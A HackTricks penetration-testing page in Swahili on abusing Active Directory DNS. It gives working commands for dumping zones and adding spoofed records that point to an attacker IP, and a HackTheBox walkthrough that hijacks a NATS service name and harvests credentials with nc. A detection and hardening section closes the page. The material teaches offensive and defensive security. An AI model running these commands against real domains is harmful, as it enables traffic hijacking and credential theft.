# Rekodi za AD DNS

{{#include ../../banners/hacktricks-training.md}}

Kwa chaguo-msingi, **mtumiaji yeyote** katika Active Directory anaweza **kuorodhesha rekodi zote za DNS** katika maeneo ya DNS ya Domain au Forest, sawa na zone transfer (watumiaji wanaweza kuorodhesha child objects za eneo la DNS katika mazingira ya AD).

Zana ya [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) huwezesha **kuorodhesha** na **kuhamisha** **rekodi zote za DNS** katika eneo hilo kwa madhumuni ya recon ya mitandao ya ndani.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) inaongeza JSON/Greppable (`--json`) output, utatuzi wa DNS wa multi-threaded na support ya TLS 1.2/1.3 wakati wa kujiunga na LDAPS

Kwa maelezo zaidi soma [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kuunda / Kurekebisha records (ADIDNS spoofing)

Kwa sababu kundi la **Authenticated Users** lina ruhusa ya **Create Child** kwenye zone DACL kwa default, account yoyote ya domain (au computer account) inaweza kusajili records za ziada. Hii inaweza kutumiwa kwa traffic hijacking, NTLM relay coercion au hata full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py inakuja pamoja na Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Mbinu za kawaida za mashambulizi

1. **Wildcard record** – `*.<zone>` hugeuza AD DNS server kuwa responder wa kiwango cha kampuni nzima, sawa na LLMNR/NBNS spoofing. Inaweza kutumiwa kukusanya NTLM hashes au kuzi-relay kwa LDAP/SMB.  (Inahitaji WINS-lookup izimwe.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – ongeza `wpad` (au **NS** record inayoelekeza kwenye attacker host ili kupita Global-Query-Block-List) na utumie proxy kwa uwazi kwenye HTTP requests zinazotoka ili kuvuna credentials. Microsoft ilirekebisha wildcard/ DNAME bypasses (CVE-2018-8320), lakini **NS-records bado zinafanya kazi**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – dai IP address iliyokuwa ya workstation hapo awali, na DNS entry inayohusishwa nayo itaendelea kutatua, hivyo kuwezesha resource-based constrained delegation au Shadow-Credentials attacks bila kugusa DNS kabisa.
4. **DHCP → DNS spoofing** – kwenye deployment chaguomsingi ya Windows DHCP+DNS, attacker asiye na authentication kwenye subnet hiyo hiyo anaweza kuandika upya A record yoyote iliyopo (ikiwemo ya Domain Controllers) kwa kutuma forged DHCP requests zinazosababisha dynamic DNS updates (Akamai “DDSpoof”, 2023).  Hii hutoa machine-in-the-middle dhidi ya Kerberos/LDAP na inaweza kusababisha full domain takeover.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya machine account unayoidhibiti, sajili matching A record, kisha omba certificate kwa jina hilo ili kujifanya DC. Tools kama **Certipy** au **BloodyAD** hu-automate mtiririko mzima.

---

### Internal service hijacking kupitia stale dynamic records (NATS case study)

Dynamic updates zinapoachwa wazi kwa users wote walio-authenticate, **jina la service lililoondolewa kwenye usajili linaweza kudaiwa tena na kuelekezwa kwenye attacker infrastructure**. Mirage HTB DC ilifichua hostname `nats-svc.mirage.htb` baada ya DNS scavenging, hivyo user yeyote mwenye privileges ndogo angeweza:<sup>[[3]](#references)</sup>

1. **Thibitisha kuwa record haipo** na ujifunze SOA kwa kutumia `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Unda tena rekodi** kuelekea kiolesura cha nje/VPN wanachodhibiti:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Jifanya kuwa huduma ya plaintext**. Clients wa NATS wanatarajia kuona banner moja ya `INFO { ... }` kabla ya kutuma credentials, hivyo kunakili banner halali kutoka kwa broker halisi kunatosha kuvuna secrets:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Mteja yeyote anayeresolve jina lililotekwa nyara ata-leak mara moja frame yake ya JSON `CONNECT` (ikiwemo `"user"`/`"pass"`) kwa listener. Kuendesha binary rasmi ya `nats-server -V` kwenye host ya mshambuliaji, kuzima log redaction yake, au kunasa session tu kwa Wireshark hutoa credentials zilezile za plaintext kwa sababu TLS ilikuwa optional.

4. **Pivot with the captured creds** – katika Mirage, akaunti ya NATS iliyoibwa ilitoa ufikiaji wa JetStream, ambao ulifichua authentication events za zamani zenye usernames/passwords za AD zinazoweza kutumika tena.

Pattern hii inatumika kwa kila service iliyounganishwa na AD inayotegemea unsecured TCP handshakes (HTTP APIs, RPC, MQTT, n.k.): mara DNS record inapotekwa nyara, mshambuliaji anakuwa service yenyewe.

---

## Detection & hardening

* Nyima **Authenticated Users** haki ya *Create all child objects* kwenye zones nyeti na delegate dynamic updates kwa account maalum inayotumiwa na DHCP.
* Ikiwa dynamic updates zinahitajika, weka zone kuwa **Secure-only** na enable **Name Protection** kwenye DHCP ili computer object ya owner pekee iweze overwrite record yake yenyewe.
* Fuatilia DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer), pamoja na LDAP writes kwenda `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Block dangerous names (`wpad`, `isatap`, `*`) kwa record iliyokusudiwa kuwa benign au kupitia Global Query Block List.
* Weka DNS servers zikiwa patched – kwa mfano, RCE bugs CVE-2024-26224 na CVE-2024-26231 zilifikia **CVSS 9.8** na zinaweza ku-exploitwa remotely dhidi ya Domain Controllers.

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, bado ni de-facto reference ya wildcard/WPAD attacks)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
